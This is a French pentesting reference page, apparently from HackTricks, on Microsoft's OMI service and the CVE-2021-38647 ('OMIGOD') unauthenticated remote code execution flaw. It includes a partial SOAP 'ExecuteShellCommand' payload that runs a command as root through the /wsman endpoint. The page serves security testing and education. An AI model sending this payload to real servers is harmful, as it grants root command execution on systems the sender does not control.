# 5985,5986 - Pentesting OMI

{{#include ../banners/hacktricks-training.md}}

### **Informations de base**

**OMI** est présenté comme un **[outil open-source](https://github.com/microsoft/omi)** par Microsoft, conçu pour la gestion de configuration à distance. Il est particulièrement pertinent pour les serveurs Linux sur Azure qui utilisent des services tels que :

- **Azure Automation**
- **Azure Automatic Update**
- **Azure Operations Management Suite**
- **Azure Log Analytics**
- **Azure Configuration Management**
- **Azure Diagnostics**

Le processus `omiengine` est initié et écoute sur toutes les interfaces en tant que root lorsque ces services sont activés.

Les **ports par défaut** utilisés sont **5985** (http) et **5986** (https).

### **[Vulnérabilité CVE-2021-38647](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-38647)**

Comme observé le 16 septembre, les serveurs Linux déployés sur Azure avec les services mentionnés sont susceptibles en raison d'une version vulnérable d'OMI. Cette vulnérabilité réside dans la gestion des messages par le serveur OMI via le point de terminaison `/wsman` sans exiger d'en-tête d'authentification, autorisant incorrectement le client.

Un attaquant peut exploiter cela en envoyant une charge utile SOAP "ExecuteShellCommand" sans en-tête d'authentification, obligeant le serveur à exécuter des commandes avec des privilèges root.
```xml
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing"
...
<s:Body>
<p:ExecuteShellCommand_INPUT xmlns:p="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem">
<p:command>id</p:command>
<p:timeout>0</p:timeout>
</p:ExecuteShellCommand_INPUT>
</s:Body>
</s:Envelope>
```
Pour plus d'informations sur ce CVE **[check this](https://github.com/horizon3ai/CVE-2021-38647)**.

## Références

- [https://www.horizon3.ai/omigod-rce-vulnerability-in-multiple-azure-linux-deployments/](https://www.horizon3.ai/omigod-rce-vulnerability-in-multiple-azure-linux-deployments/)
- [https://blog.wiz.io/omigod-critical-vulnerabilities-in-omi-azure/](https://blog.wiz.io/omigod-critical-vulnerabilities-in-omi-azure/)

{{#include ../banners/hacktricks-training.md}}
